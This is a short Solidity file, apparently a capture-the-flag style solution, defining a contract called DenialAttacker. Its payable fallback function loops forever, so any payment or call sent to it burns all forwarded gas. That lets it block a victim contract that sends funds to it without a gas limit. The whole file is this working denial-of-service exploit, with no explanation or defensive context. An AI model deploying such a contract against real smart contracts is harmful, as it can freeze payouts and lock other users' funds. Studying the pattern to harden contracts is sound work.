// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract DenialAttacker {
    fallback() external payable {
        while (true) {}
    }
}
